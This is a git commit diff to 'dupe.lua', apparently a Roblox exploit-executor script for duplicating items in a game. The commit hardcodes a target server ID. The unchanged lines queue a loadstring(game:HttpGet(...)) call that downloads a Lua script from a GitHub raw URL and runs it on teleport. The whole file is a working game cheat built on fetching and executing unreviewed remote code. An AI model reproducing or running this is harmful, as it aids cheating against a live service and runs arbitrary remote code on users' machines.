f2d34a4d3add420179e9383790e4be592b38f141
n1x <pnipon74@gmail.com>
2025-06-19 18:21:14 +0300

    dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,5 +1,5 @@
 local TeleportService = cloneref(game:GetService("TeleportService"))  
-local jobId = game.JobId 
+local jobId = '57d478b2-4f1d-407f-9df5-6fae31828712' 
 
 queue_on_teleport([[  
     loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupeV2.lua'))()
